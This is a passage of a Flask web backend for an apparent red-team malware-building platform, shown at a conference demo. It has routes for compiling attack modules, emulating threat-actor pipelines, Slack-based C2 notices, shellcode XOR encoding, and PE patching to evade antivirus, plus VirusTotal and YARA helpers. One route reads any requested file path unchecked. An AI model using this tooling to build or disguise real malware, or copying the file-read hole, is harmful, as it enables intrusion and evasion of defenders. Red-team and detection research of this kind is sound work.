    webhook = cfg.get("webhook_url", "")
    if not webhook or "YOUR/WEBHOOK" in webhook:
        return jsonify({"ok": False, "error": "slack webhook not configured"}), 400

    body   = request.get_json(silent=True) or {}
    binary = _c2_resolve_binary(body)
    if not binary:
        return jsonify({"ok": False, "error": "no binary selected or found"}), 400

    text = body.get("text",
        f"*[peekaboo]* payload ready\n"
        f">*file:* `{binary.name}`\n"
        f">*size:* `{binary.stat().st_size:,}` bytes\n"
        f">*time:* `{datetime.utcnow().isoformat()}Z`\n"
        f">_DEFCON Demo Labs Singapore 2026 - by @cocomelonc_")

    try:
        resp = _requests.post(webhook, json={"text": text}, timeout=10)
        if resp.status_code == 200:
            return jsonify({
                "ok":        True,
                "channel":   "slack",
                "file":      binary.name,
                "size":      binary.stat().st_size,
                "technique": "T1102 + T1071.001",
            })
        else:
            return jsonify({"ok": False, "error": resp.text[:300]}), 400
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


@app.route("/api/c2/binary_info")
def api_binary_info():
    """Return info about the latest built binary."""
    binary = _find_latest_binary()
    if not binary:
        return jsonify({"found": False})
    st = binary.stat()
    return jsonify({
        "found":    True,
        "path":     str(binary.relative_to(BASE_DIR)),
        "name":     binary.name,
        "size":     st.st_size,
        "modified": datetime.fromtimestamp(st.st_mtime).isoformat(),
    })


# -- chatbot routes -------------------------------------------------------------

@app.route("/api/chat", methods=["POST"])
def api_chat():
    """
    SSE streaming chat endpoint.
    Body: {"messages": [{role, content}, ...]}
    """
    if not HAS_CHATBOT:
        return jsonify({"error": "chatbot module not available"}), 503

    data = request.get_json(silent=True) or {}
    messages  = data.get("messages", [])
    provider  = data.get("provider", "claude")  # "claude" | "gemini" | "ollama"
    if not messages:
        return jsonify({"error": "no messages provided"}), 400

    def generate():
        # Never yield in `finally` of an SSE generator (see api_pipeline_run).
        try:
            for chunk in stream_chat(messages, provider=provider):
                if isinstance(chunk, dict):
                    yield f"data: {json.dumps(chunk)}\n\n"
                else:
                    yield f"data: {json.dumps({'text': chunk})}\n\n"
            yield "data: [DONE]\n\n"
        except GeneratorExit:
            raise
        except Exception as e:
            try:
                yield f"data: {json.dumps({'error': str(e)})}\n\n"
                yield "data: [DONE]\n\n"
            except GeneratorExit:
                raise

    return Response(
        stream_with_context(generate()),
        content_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "X-Accel-Buffering": "no",
        }
    )


@app.route("/api/chat/kb_info")
def api_kb_info():
    if not HAS_CHATBOT:
        return jsonify({"status": "chatbot_unavailable"})
    return jsonify(kb_info())


@app.route("/api/chat/providers")
def api_providers():
    return jsonify(providers_status())


@app.route("/api/chat/scrape", methods=["POST"])
def api_scrape():
    """Trigger blog scraper in background."""
    def _scrape():
        try:
            from scraper import scrape
            scrape()
        except Exception as e:
            print(f"[scraper error] {e}")

    t = threading.Thread(target=_scrape, daemon=True)
    t.start()
    return jsonify({"ok": True, "message": "indexer started - check /api/chat/kb_info for status"})


# -- MITRE ATT&CK routes -------------------------------------------------------

@app.route("/api/mitre/available")
def api_mitre_available():
    return jsonify({"available": HAS_MITRE and mitre_available() if HAS_MITRE else False})


@app.route("/api/mitre/groups")
def api_mitre_groups():
    if not HAS_MITRE:
        return jsonify({"error": "mitre module not available"}), 503
    if not mitre_available():
        return jsonify({"error": "STIX bundle not found"}), 503

    q     = request.args.get("q", "").lower().strip()
    page  = max(0, int(request.args.get("page",  0)))
    limit = max(1, int(request.args.get("limit", 10)))

    groups = get_groups()
    if q:
        groups = [
            g for g in groups
            if q in g["name"].lower()
            or any(q in a.lower() for a in g.get("aliases", []))
        ]

    total = len(groups)
    start = page * limit
    items = groups[start:start + limit]
    return jsonify({
        "items": items,
        "total": total,
        "page":  page,
        "pages": max(1, (total + limit - 1) // limit),
    })


@app.route("/api/mitre/techniques")
def api_mitre_all_techniques():
    if not HAS_MITRE:
        return jsonify({"error": "mitre module not available"}), 503
    return jsonify(get_all_techniques())


@app.route("/api/mitre/library")
def api_mitre_library():
    if not HAS_MITRE:
        return jsonify({"error": "mitre module not available"}), 503

    # ensure DB is populated
    if _db.count_mitre_entries() == 0:
        entries = get_library("all")
        _db.save_mitre_entries(entries)

    q        = request.args.get("q", "").strip()
    category = request.args.get("category", "")
    page     = max(0, int(request.args.get("page",  0)))
    limit    = max(1, int(request.args.get("limit", 10)))
    offset   = page * limit

    items = _db.get_mitre_entries_paged(q, category, offset, limit)
    total = _db.count_mitre_entries_filtered(q, category)
    return jsonify({
        "items": items,
        "total": total,
        "page":  page,
        "pages": max(1, (total + limit - 1) // limit),
    })


@app.route("/api/mitre/ttp_implementations")
def api_mitre_ttp_implementations():
    q        = request.args.get("q",        "").strip()
    tactic   = request.args.get("tactic",   "").strip()
    platform = request.args.get("platform", "").strip()
    page     = max(0, int(request.args.get("page",  0)))
    limit    = max(1, int(request.args.get("limit", 10)))

    rows = _db.get_ttp_implementations(
        platform=platform or None,
        q=q       or None,
    )
    if tactic:
        rows = [r for r in rows if r["tactic"] == tactic]

    total  = len(rows)
    offset = page * limit
    items  = rows[offset:offset + limit]
    return jsonify({
        "items": items,
        "total": total,
        "page":  page,
        "pages": max(1, (total + limit - 1) // limit),
    })


@app.route("/api/mitre/library/entry/<path:slug>")
def api_mitre_library_entry(slug: str):
    entry = _db.get_mitre_entry(slug)
    if not entry:
        return jsonify({"error": "not found"}), 404
    src_path = entry.get("src_path", "")
    full_source = ""
    if src_path:
        p = Path(src_path)
        if p.exists() and p.is_file():
            try:
                full_source = p.read_text(encoding="utf-8", errors="replace")
            except Exception:
                pass
    return jsonify({**entry, "full_source": full_source})


@app.route("/api/mitre/library/rebuild", methods=["POST"])
def api_mitre_library_rebuild():
    if not HAS_MITRE:
        return jsonify({"error": "mitre module not available"}), 503
    def _rebuild():
        entries = build_library_cache()
        if entries:
            _db.save_mitre_entries(entries)
    threading.Thread(target=_rebuild, daemon=True).start()
    return jsonify({"ok": True, "message": "rebuilding library cache in background"})


@app.route("/api/reindex")
def api_reindex():
    """SSE stream: full reindex - library cache -> embeddings -> KB scrape."""
    def generate():
        import time

        def evt(step, status, msg, detail=None):
            obj = {"step": step, "status": status, "msg": msg}
            if detail is not None:
                obj["detail"] = detail
            return f"data: {json.dumps(obj)}\n\n"

        # -- step 1: blog post library cache ----------------------------------
        yield evt("library", "running", "scanning blog posts…")
        try:
            if HAS_MITRE:
                posts = build_library_cache()
                if posts:
                    _db.save_mitre_entries(posts)
                n = len(posts) if posts else 0
                yield evt("library", "done", f"indexed {n} posts", n)
            else:
                yield evt("library", "skip", "mitre module not available")
        except Exception as e:
            yield evt("library", "error", str(e))

        # -- step 2: semantic embeddings ---------------------------------------
        yield evt("embeddings", "running", "building semantic embeddings via Ollama…")
        try:
            import sys as _sys, os as _os
            _sys.path.insert(0, _os.path.dirname(__file__))
            from semantic import build_post_embeddings, available as sem_available
            if not sem_available():
                yield evt("embeddings", "skip", "Ollama / nomic-embed-text not available")
            else:
                ok = build_post_embeddings(force=True)
                if ok:
                    from semantic import _EMB_CACHE
                    n = len(json.loads(_EMB_CACHE.read_text()))
                    yield evt("embeddings", "done", f"embedded {n} posts", n)
                else:
                    yield evt("embeddings", "error", "embedding failed")
        except Exception as e:
            yield evt("embeddings", "error", str(e))

        # -- step 3: knowledge base (chatbot KB scrape) ------------------------
        yield evt("kb", "running", "scraping knowledge base from blog…")
        try:
            if HAS_CHATBOT:
                from scraper import scrape
                scrape()
                from chatbot import kb_info
                info = kb_info()
                n = info.get("posts", 0)
                yield evt("kb", "done", f"indexed {n} posts into KB", n)
            else:
                yield evt("kb", "skip", "chatbot module not available")
        except Exception as e:
            yield evt("kb", "error", str(e))

        yield f"data: {json.dumps({'step': 'done', 'status': 'done', 'msg': 'reindex complete'})}\n\n"

    return Response(
        stream_with_context(generate()),
        content_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


@app.route("/api/mitre/library/categories")
def api_mitre_library_cats():
    if _db.count_mitre_entries() == 0 and HAS_MITRE:
        _db.save_mitre_entries(get_library("all"))
    return jsonify(_db.get_mitre_categories())


@app.route("/api/mitre/group/<stix_id>/techniques")
def api_mitre_techniques(stix_id: str):
    if not HAS_MITRE:
        return jsonify({"error": "mitre module not available"}), 503
    category = request.args.get("category", "all")
    return jsonify(get_group_techniques(stix_id, category))


# -- Malpedia routes ------------------------------------------------------------

@app.route("/api/malpedia/status")
def api_malpedia_status():
    if not HAS_MALPEDIA:
        return jsonify({"ok": False, "error": "malpedia module not available"}), 503
    return jsonify(_malpedia.get_status())


@app.route("/api/malpedia/actors")
def api_malpedia_actors():
    if not HAS_MALPEDIA:
        return jsonify([]), 503
    refresh = request.args.get("refresh") == "1"
    return jsonify(_malpedia.list_actors(force_refresh=refresh))


@app.route("/api/malpedia/actor/<actor_id>")
def api_malpedia_actor(actor_id: str):
    if not HAS_MALPEDIA:
        return jsonify({"error": "unavailable"}), 503
    return jsonify(_malpedia.get_actor(actor_id))


@app.route("/api/malpedia/families")
def api_malpedia_families():
    if not HAS_MALPEDIA:
        return jsonify([]), 503
    refresh = request.args.get("refresh") == "1"
    return jsonify(_malpedia.list_families(force_refresh=refresh))


@app.route("/api/malpedia/family/<path:family_id>")
def api_malpedia_family(family_id: str):
    if not HAS_MALPEDIA:
        return jsonify({"error": "unavailable"}), 503
    return jsonify(_malpedia.get_family(family_id))


@app.route("/api/malpedia/reports")
def api_malpedia_reports():
    if not HAS_MALPEDIA:
        return jsonify({"error": "unavailable"}), 503
    limit = min(int(request.args.get("limit", 50)), 200)
    return jsonify(_malpedia.get_recent_reports(limit=limit))


@app.route("/api/malpedia/search")
def api_malpedia_search():
    if not HAS_MALPEDIA:
        return jsonify({"actors": [], "families": []}), 503
    q    = request.args.get("q", "").strip()
    kind = request.args.get("type", "all")
    if not q:
        return jsonify({"actors": [], "families": []})
    actors   = _malpedia.find_actor(q)   if kind in ("all", "actor")  else []
    families = _malpedia.find_family(q)  if kind in ("all", "family") else []
    return jsonify({"actors": actors[:50], "families": families[:50]})


@app.route("/api/semantic/status")
def api_semantic_status():
    try:
        from semantic import available, _EMB_CACHE
        emb_count = 0
        if _EMB_CACHE.exists():
            import json as _json
            emb_count = len(_json.loads(_EMB_CACHE.read_text()))
        return jsonify({"available": available(), "embedded_posts": emb_count})
    except Exception as e:
        return jsonify({"available": False, "error": str(e)})


@app.route("/api/semantic/rebuild", methods=["POST"])
def api_semantic_rebuild():
    try:
        from semantic import build_post_embeddings
        ok = build_post_embeddings(force=True)
        return jsonify({"ok": ok})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


# -- Module Library (discovery) ------------------------------------------------

@app.route("/api/library")
def api_library():
    if not HAS_DISCOVERY:
        return jsonify({"error": "discovery module not available"}), 503
    category = request.args.get("category", "all")
    platform = request.args.get("platform", "all")
    q        = request.args.get("q", "").lower().strip()
    modules  = _discovery.scan_all()
    if category != "all":
        modules = [m for m in modules if m["category"] == category]
    if platform != "all":
        modules = [m for m in modules if m["platform"] == platform]
    if q:
        modules = [m for m in modules if
                   q in m["title"].lower() or
                   q in m["slug"].lower() or
                   any(q in a.lower() for a in m["attack_ids"])]
    # strip heavy snippet for list view
    return jsonify([{k: v for k, v in m.items() if k != "snippet"} for m in modules])


@app.route("/api/library/stats")
def api_library_stats():
    if not HAS_DISCOVERY:
        return jsonify({"error": "discovery module not available"}), 503
    return jsonify(_discovery.get_stats())


@app.route("/api/library/rebuild", methods=["POST"])
def api_library_rebuild():
    if not HAS_DISCOVERY:
        return jsonify({"error": "discovery module not available"}), 503
    def _rebuild():
        _discovery.build_registry()
    threading.Thread(target=_rebuild, daemon=True).start()
    return jsonify({"ok": True, "msg": "rebuilding in background"})


@app.route("/api/library/source")
def api_library_source():
    path = request.args.get("path", "")
    if not path:
        return "missing path", 400
    p = Path(path)
    if not p.exists() or not p.is_file():
        return "not found", 404
    try:
        return p.read_text(encoding="utf-8", errors="replace"), 200, {"Content-Type": "text/plain; charset=utf-8"}
    except Exception as e:
        return str(e), 500


@app.route("/api/library/<path:module_id>")
def api_library_module(module_id: str):
    if not HAS_DISCOVERY:
        return jsonify({"error": "discovery module not available"}), 503
    mod = _discovery.get_module(module_id)
    if not mod:
        return jsonify({"error": "not found"}), 404
    # include full snippet + source text
    src_path = Path(mod["src_path"])
    full_src = ""
    if src_path.exists():
        try:
            full_src = src_path.read_text(encoding="utf-8", errors="replace")
        except Exception:
            pass
    return jsonify({**mod, "full_source": full_src})


@app.route("/api/library/<path:module_id>/compile", methods=["POST"])
def api_library_compile(module_id: str):
    if not HAS_COMPILER:
        return jsonify({"error": "compiler module not available"}), 503
    session_id = uuid.uuid4().hex[:8]
    result_holder: list = []

    def _compile():
        ok, log, out = _compiler.compile_module(module_id, session_id)
        result_holder.append((ok, log, str(out) if out else None))

    t = threading.Thread(target=_compile, daemon=True)
    t.start()
    t.join(timeout=90)

    if not result_holder:
        return jsonify({"ok": False, "error": "compilation timed out"}), 500

    ok, log, out_path = result_holder[0]
    resp: dict = {"ok": ok, "session_id": session_id, "log": log}
    if ok and out_path:
        p = Path(out_path)
        size = p.stat().st_size if p.exists() else 0
        resp["file"]     = p.name
        resp["size"]     = size
        resp["download"] = f"/api/samples/{session_id}/download/{p.name}"
        _db.save_sample({
            "session_id": session_id,
            "files":      [{"name": p.name, "size": size}],
            "total_size": size,
            "actor":      "",
            "ttps":       0,
            "status":     "built",
        })
    return jsonify(resp), 200 if ok else 500


# -- Samples -------------------------------------------------------------------

@app.route("/api/samples")
def api_samples():
    return jsonify(_db.get_samples())


@app.route("/api/samples", methods=["DELETE"])
def api_samples_clear():
    try:
        _db.clear_samples()
        _db.clear_reports()
        _db.clear_pipeline_sessions()
        import shutil
        if SAMPLES_DIR.exists():
            for d in SAMPLES_DIR.iterdir():
                if d.is_dir():
                    shutil.rmtree(d, ignore_errors=True)
        return jsonify({"ok": True})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


@app.route("/api/samples/<session_id>")
def api_sample(session_id: str):
    if not re.match(r'^[a-f0-9]{8}$', session_id):
        return jsonify({"error": "invalid session id"}), 400
    d = SAMPLES_DIR / session_id
    if not d.exists():
        return jsonify({"error": "not found"}), 404
    files = [{"name": f.name, "size": f.stat().st_size} for f in d.iterdir() if f.is_file()]
    meta: dict = {}
    meta_path = PIPELINE_DIR / session_id / "meta.json"
    if meta_path.exists():
        try:
            meta = json.loads(meta_path.read_text())
        except Exception:
            pass
    return jsonify({"session_id": session_id, "files": files, "meta": meta})


@app.route("/api/samples/<session_id>/download/<filename>")
def api_sample_download(session_id: str, filename: str):
    if not re.match(r'^[a-f0-9]{8}$', session_id):
        return jsonify({"error": "invalid id"}), 400
    safe = re.sub(r'[^a-zA-Z0-9._-]', '', filename)
    path = SAMPLES_DIR / session_id / safe
    if not path.exists() or not path.is_file():
        return jsonify({"error": "not found"}), 404
    return send_file(path, as_attachment=True, download_name=safe,
                     mimetype="application/octet-stream")


# -- APT Pipeline --------------------------------------------------------------

@app.route("/api/pipeline/run", methods=["POST"])
def api_pipeline_run():
    data     = request.get_json(silent=True) or {}
    actor_id = data.get("actor_id", "").strip()
    if not actor_id:
        return jsonify({"error": "actor_id required"}), 400

    def generate():
        # NOTE: never yield inside `finally` of an SSE generator. When the client
        # disconnects, Flask injects GeneratorExit at the current suspended yield;
        # yielding again from `finally` raises "generator ignored GeneratorExit"
        # (the BrokenPipeError noise we were seeing). The [DONE] sentinel is
        # emitted only on the normal exit paths below.
        try:
            sys.path.insert(0, str(BASE_DIR / "pipeline"))
            from apt_pipeline import run_pipeline
            for event in run_pipeline(actor_id):
                yield f"data: {json.dumps(event)}\n\n"
                # persist completed pipeline sample to DB
                if event.get("status") == "complete":
                    d = event.get("data", {})
                    sid = d.get("session_id", "")
                    if sid:
                        files, total = [], 0
                        sample_path = SAMPLES_DIR / sid
                        if sample_path.exists():
                            for fp in sample_path.iterdir():
                                if fp.is_file() and not fp.name.startswith("."):
                                    sz = fp.stat().st_size
                                    files.append({"name": fp.name, "size": sz})
                                    total += sz
                        sess = _db.get_pipeline_session(sid)
                        ttps_count = len(sess.get("ttps", [])) if sess else 0
                        _db.save_sample({
                            "session_id": sid,
                            "files":      files,
                            "total_size": total,
                            "actor":      actor_id,
                            "ttps":       ttps_count,
                            "status":     "success",
                        })
            yield "data: [DONE]\n\n"
        except GeneratorExit:
            # client closed the EventSource - must re-raise without yielding
            raise
        except Exception as e:
            try:
                yield f"data: {json.dumps({'step': 0, 'status': 'error', 'msg': str(e)})}\n\n"
                yield "data: [DONE]\n\n"
            except GeneratorExit:
                raise

    return Response(
        stream_with_context(generate()),
        content_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


@app.route("/api/pipeline/sessions")
def api_pipeline_sessions():
    return jsonify(_db.get_pipeline_sessions())


@app.route("/api/pipeline/clear", methods=["POST"])
def api_pipeline_clear():
    """
    Wipe APT pipeline state: per-session sample folders, reports, samples DB
    rows, and pipeline_sessions DB rows. The samples/ directory tree itself is
    preserved so future runs can write into it again.
    """
    deleted_dirs    = 0
    deleted_files   = 0
    errors: list[str] = []

    if SAMPLES_DIR.exists():
        for child in SAMPLES_DIR.iterdir():
            if not child.is_dir():
                continue
            # only wipe session-id-shaped dirs (8 hex chars), defensive guard
            if not re.match(r"^[a-f0-9]{8}$", child.name):
                continue
            try:
                file_count = sum(1 for _ in child.rglob("*") if _.is_file())
                shutil.rmtree(child)
                deleted_dirs  += 1
                deleted_files += file_count
            except Exception as e:
                errors.append(f"{child.name}: {e}")

    db_counts = {
        "pipeline_sessions": len(_db.get_pipeline_sessions()),
        "samples":           len(_db.get_samples()),
    }
    try:
        _db.clear_pipeline_sessions()
        _db.clear_reports()
        _db.clear_samples()
    except Exception as e:
        errors.append(f"db: {e}")

    return jsonify({
        "ok":             not errors,
        "deleted_dirs":   deleted_dirs,
        "deleted_files":  deleted_files,
        "db_cleared":     db_counts,
        "errors":         errors,
    })


@app.route("/api/pipeline/session/<session_id>")
def api_pipeline_session(session_id: str):
    if not re.match(r'^[a-f0-9]{8}$', session_id):
        return jsonify({"error": "invalid id"}), 400
    session = _db.get_pipeline_session(session_id)
    if not session:
        return jsonify({"error": "not found"}), 404
    reports = _db.get_reports(session_id)
    sample  = next((s for s in _db.get_samples() if s["session_id"] == session_id), None)
    # filesystem fallback for samples compiled before DB migration
    if not sample:
        sp = SAMPLES_DIR / session_id
        if sp.exists():
            flist = [{"name": f.name, "size": f.stat().st_size}
                     for f in sp.iterdir() if f.is_file() and not f.name.startswith(".")]
            if flist:
                sample = {"session_id": session_id, "files": flist,
                          "total_size": sum(f["size"] for f in flist), "status": "built"}
    return jsonify({
        "session": session,
        "reports": reports,
        "sample":  sample,
    })


# -- Coverage map --------------------------------------------------------------

@app.route("/api/coverage")
def api_coverage():
    if not HAS_DISCOVERY:
        return jsonify({}), 503
    return jsonify(_discovery.coverage_map())


# -- VirusTotal scanner --------------------------------------------------------

try:
    import vtscan as _vtscan
    HAS_VTSCAN = True
except ImportError:
    HAS_VTSCAN = False


@app.route("/api/vtscan/upload", methods=["POST"])
def api_vtscan_upload():
    if not HAS_VTSCAN:
        return jsonify({"ok": False, "error": "vtscan module not available"}), 503
    data = request.get_json(force=True) or {}
    session_id = data.get("session_id", "").strip()
    filename   = data.get("filename", "").strip()
    if not session_id or not filename:
        return jsonify({"ok": False, "error": "session_id and filename required"}), 400
    # restrict to safe path inside samples dir
    filepath = (SAMPLES_DIR / session_id / filename).resolve()
    if not str(filepath).startswith(str(SAMPLES_DIR.resolve())):
        return jsonify({"ok": False, "error": "invalid path"}), 400
    result = _vtscan.upload_file(filepath)
    return jsonify(result)


@app.route("/api/vtscan/analysis/<analysis_id>")
def api_vtscan_analysis(analysis_id: str):
    if not HAS_VTSCAN:
        return jsonify({"ok": False, "error": "vtscan module not available"}), 503
    result = _vtscan.poll_analysis(analysis_id)
    return jsonify(result)


@app.route("/api/vtscan/file/<sha256>")
def api_vtscan_file(sha256: str):
    if not HAS_VTSCAN:
        return jsonify({"ok": False, "error": "vtscan module not available"}), 503
    result = _vtscan.get_by_hash(sha256)
    return jsonify(result)


@app.route("/api/vtscan/upload-raw", methods=["POST"])
def api_vtscan_upload_raw():
    """Upload any file directly to VirusTotal (no session required)."""
    if not HAS_VTSCAN:
        return jsonify({"ok": False, "error": "vtscan module not available"}), 503
    f = request.files.get("file")
    if not f:
        return jsonify({"ok": False, "error": "no file uploaded"}), 400
    import tempfile, os
    suffix = "_" + (f.filename or "upload")
    with tempfile.NamedTemporaryFile(delete=False, suffix=suffix) as tmp:
        f.save(tmp.name)
        tmp_path = Path(tmp.name)
    try:
        result = _vtscan.upload_file(tmp_path)
        if result.get("ok") and not result.get("name"):
            result["name"] = f.filename
    finally:
        try:
            os.unlink(tmp_path)
        except Exception:
            pass
    return jsonify(result)


@app.route("/api/vtscan/from-build", methods=["POST"])
def api_vtscan_from_build():
    """Upload a compiled build binary directly to VirusTotal."""
    if not HAS_VTSCAN:
        return jsonify({"ok": False, "error": "vtscan module not available"}), 503
    data = request.get_json(force=True) or {}
    build_id = data.get("build_id", "").strip()
    if not build_id:
        return jsonify({"ok": False, "error": "build_id required"}), 400
    job = _build_mgr.get(build_id) or {}
    if not job:
        return jsonify({"ok": False, "error": "build not found"}), 404
    if job.get("status") != "success":
        return jsonify({"ok": False, "error": "build did not succeed"}), 400
    p = _resolve_build_binary(job)
    if not p:
        return jsonify({"ok": False, "error": "binary not found on disk"}), 404
    fname = data.get("fname", "").strip()
    if fname and fname != p.name:
        if "/" in fname or "\\" in fname or not fname.lower().endswith(".exe"):
            return jsonify({"ok": False, "error": "invalid fname"}), 400
        alt = p.parent / fname
        if not alt.exists():
            return jsonify({"ok": False, "error": f"{fname} not found on disk"}), 404
        p = alt
    result = _vtscan.upload_file(p)
    result["build_id"] = build_id
    result["binary"]   = p.name
    return jsonify(result)


# -- YARA rule generator -------------------------------------------------------

try:
    import yaragen as _yaragen
    HAS_YARAGEN = True
except ImportError:
    HAS_YARAGEN = False


@app.route("/api/yara/generate", methods=["POST"])
def api_yara_generate():
    if not HAS_YARAGEN:
        return jsonify({"ok": False, "error": "yaragen module not available"}), 503
    data = request.get_json(force=True) or {}
    session_id = data.get("session_id", "").strip()
    filename   = data.get("filename", "").strip()
    if not session_id or not filename:
        return jsonify({"ok": False, "error": "session_id and filename required"}), 400
    filepath = (SAMPLES_DIR / session_id / filename).resolve()
    if not str(filepath).startswith(str(SAMPLES_DIR.resolve())):
        return jsonify({"ok": False, "error": "invalid path"}), 400
    result = _yaragen.generate_rule(filepath)
    return jsonify(result)


@app.route("/api/yara/upload", methods=["POST"])
def api_yara_upload():
    """Generate a YARA rule from an uploaded file (no session needed)."""
    if not HAS_YARAGEN:
        return jsonify({"ok": False, "error": "yaragen module not available"}), 503
    f = request.files.get("file")
    if not f:
        return jsonify({"ok": False, "error": "no file uploaded"}), 400
    import tempfile, os
    with tempfile.NamedTemporaryFile(delete=False, suffix="_" + f.filename) as tmp:
        f.save(tmp.name)
        tmp_path = Path(tmp.name)
    try:
        result = _yaragen.generate_rule(tmp_path)
        result["rule_name"] = re.sub(r'[^a-zA-Z0-9_]', '_',
                                     Path(f.filename).stem) or result.get("rule_name", "uploaded")
    finally:
        try:
            os.unlink(tmp_path)
        except Exception:
            pass
    return jsonify(result)


@app.route("/api/yara/from-build", methods=["POST"])
def api_yara_from_build():
    """Generate a YARA rule directly from a compiled build binary."""
    if not HAS_YARAGEN:
        return jsonify({"ok": False, "error": "yaragen module not available"}), 503
    data = request.get_json(force=True) or {}
    build_id = data.get("build_id", "").strip()
    if not build_id:
        return jsonify({"ok": False, "error": "build_id required"}), 400
    job = _build_mgr.get(build_id) or {}
    if not job:
        return jsonify({"ok": False, "error": "build not found"}), 404
    if job.get("status") != "success":
        return jsonify({"ok": False, "error": "build did not succeed"}), 400
    p = _resolve_build_binary(job)
    if not p:
        return jsonify({"ok": False, "error": "binary not found on disk"}), 404
    fname = data.get("fname", "").strip()
    if fname and fname != p.name:
        if "/" in fname or "\\" in fname or not fname.lower().endswith(".exe"):
            return jsonify({"ok": False, "error": "invalid fname"}), 400
        alt = p.parent / fname
        if not alt.exists():
            return jsonify({"ok": False, "error": f"{fname} not found on disk"}), 404
        p = alt
    result = _yaragen.generate_rule(p)
    result["rule_name"] = re.sub(r'[^a-zA-Z0-9_]', '_', p.stem) or result.get("rule_name", "build")
    result["build_id"]  = build_id
    result["binary"]    = p.name
    return jsonify(result)


# -- Shellcode swiss-army knife ------------------------------------------------

try:
    import shellcode as _shellcode
    HAS_SHELLCODE = True
except ImportError:
    HAS_SHELLCODE = False


@app.route("/api/shellcode/process", methods=["POST"])
def api_shellcode_process():
    if not HAS_SHELLCODE:
        return jsonify({"ok": False, "error": "shellcode module not available"}), 503
    data = request.get_json(force=True) or {}
    raw        = data.get("input", "")
    fmt        = data.get("output_format", "c")
    transform  = data.get("transform", "none")
    xor_key    = data.get("xor_key", "")
    var_name   = data.get("var_name", "buf")
    if not raw:
        return jsonify({"ok": False, "error": "input is required"}), 400
    if fmt not in _shellcode.VALID_FORMATS:
        return jsonify({"ok": False, "error": f"unknown format '{fmt}'"}), 400
    result = _shellcode.process(raw, fmt, transform, xor_key, var_name)
    return jsonify(result)


@app.route("/api/shellcode/analyse", methods=["POST"])
def api_shellcode_analyse():
    if not HAS_SHELLCODE:
        return jsonify({"ok": False, "error": "shellcode module not available"}), 503
    data = request.get_json(force=True) or {}
    raw = data.get("input", "")
    if not raw:
        return jsonify({"ok": False, "error": "input is required"}), 400
    result = _shellcode.analyse_only(raw)
    return jsonify(result)


@app.route("/api/shellcode/upload", methods=["POST"])
def api_shellcode_upload():
    """Receive a binary file, return hex representation + analysis."""
    if not HAS_SHELLCODE:
        return jsonify({"ok": False, "error": "shellcode module not available"}), 503
    f = request.files.get("file")
    if not f:
        return jsonify({"ok": False, "error": "no file provided"}), 400
    data = f.read(1024 * 1024 * 8)  # cap at 8 MB
    if not data:
        return jsonify({"ok": False, "error": "empty file"}), 400
    stats = _shellcode.analyse(data)
    stats["ok"] = True
    stats["hex"] = data.hex()
    return jsonify(stats)


# -- Evasion Score + Obfuscation Lab -------------------------------------------

try:
    import evasion as _evasion
    HAS_EVASION = True
except ImportError:
    HAS_EVASION = False


@app.route("/api/evasion/analyse", methods=["POST"])
def api_evasion_analyse():
    if not HAS_EVASION:
        return jsonify({"ok": False, "error": "evasion module not available"}), 503
    data = request.get_json(force=True) or {}

    build_id = data.get("build_id", "").strip()
    if build_id:
        job = _build_mgr.get(build_id) or {}
        if not job or job.get("status") != "success":
            return jsonify({"ok": False, "error": "build not found or not successful"}), 404
        p = _resolve_build_binary(job)
        if not p:
            return jsonify({"ok": False, "error": "binary not found on disk"}), 404
        fname = data.get("fname", "").strip()
        if fname and fname != p.name:
            if "/" in fname or "\\" in fname or not fname.lower().endswith(".exe"):
                return jsonify({"ok": False, "error": "invalid fname"}), 400
            alt = p.parent / fname
            if not alt.exists():
                return jsonify({"ok": False, "error": f"{fname} not found on disk"}), 404
            p = alt
        result = _evasion.analyse(p.read_bytes(), p.name)
        return jsonify(result)

    session_id = data.get("session_id", "").strip()
    filename   = data.get("filename", "").strip()
    if not session_id or not filename:
        return jsonify({"ok": False, "error": "session_id and filename required"}), 400
    filepath = (SAMPLES_DIR / session_id / filename).resolve()
    if not str(filepath).startswith(str(SAMPLES_DIR.resolve())):
        return jsonify({"ok": False, "error": "invalid path"}), 400
    if not filepath.exists():
        return jsonify({"ok": False, "error": "file not found"}), 404
    raw = filepath.read_bytes()
    result = _evasion.analyse(raw, filename)
    return jsonify(result)


@app.route("/api/evasion/upload", methods=["POST"])
def api_evasion_upload():
    if not HAS_EVASION:
        return jsonify({"ok": False, "error": "evasion module not available"}), 503
    f = request.files.get("file")
    if not f:
        return jsonify({"ok": False, "error": "no file uploaded"}), 400
    raw = f.read(1024 * 1024 * 32)  # 32 MB cap
    if not raw:
        return jsonify({"ok": False, "error": "empty file"}), 400
    result = _evasion.analyse(raw, f.filename or "uploaded")
    return jsonify(result)


@app.route("/api/evasion/patch", methods=["POST"])
def api_evasion_patch():
    """Apply selected PE patch transforms; return patched binary as download."""
    if not HAS_EVASION:
        return jsonify({"ok": False, "error": "evasion module not available"}), 503

    patch_ids: list[str] = []
    raw: bytes = b""
    out_name = "patched.exe"

    if request.content_type and "multipart" in request.content_type:
        f = request.files.get("file")
        if not f:
            return jsonify({"ok": False, "error": "no file"}), 400
        raw = f.read(1024 * 1024 * 32)
        out_name = "patched_" + (f.filename or "binary")
        try:
            patch_ids = json.loads(request.form.get("patches", "[]"))
        except Exception:
            patch_ids = []
    else:
        data = request.get_json(force=True) or {}
        patch_ids  = data.get("patches", [])
        build_id   = data.get("build_id", "").strip()
        session_id = data.get("session_id", "").strip()
        filename   = data.get("filename", "").strip()
        if build_id:
            job = _build_mgr.get(build_id) or {}
            if job and job.get("status") == "success":
                p = _resolve_build_binary(job)
                if p:
                    fname = data.get("fname", "").strip()
                    if fname and fname != p.name:
                        if "/" not in fname and "\\" not in fname and fname.lower().endswith(".exe"):
                            alt = p.parent / fname
                            if alt.exists():
                                p = alt
                    raw = p.read_bytes()
                    out_name = "patched_" + p.name
        elif session_id and filename:
            filepath = (SAMPLES_DIR / session_id / filename).resolve()
            if not str(filepath).startswith(str(SAMPLES_DIR.resolve())):
                return jsonify({"ok": False, "error": "invalid path"}), 400
            if filepath.exists():
                raw = filepath.read_bytes()
                out_name = "patched_" + filename

    if not raw:
        return jsonify({"ok": False, "error": "no binary data"}), 400
    if not patch_ids:
        return jsonify({"ok": False, "error": "no patches requested"}), 400

